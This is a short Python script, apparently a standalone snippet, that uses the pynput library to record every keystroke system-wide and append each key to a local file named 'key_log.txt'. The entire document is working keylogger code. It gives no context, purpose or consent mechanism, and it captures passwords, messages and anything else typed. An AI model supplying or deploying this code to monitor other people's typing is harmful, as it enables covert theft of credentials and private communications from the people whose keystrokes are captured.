from pynput.keyboard import Listener

log_file = "key_log.txt"

def log_keystroke(key):
    key = str(key).replace("'", "")
    with open(log_file, "a") as file:
        file.write(key + "\n")

def on_press(key):
    log_keystroke(key)

with Listener(on_press=on_press) as listener:
    listener.join()
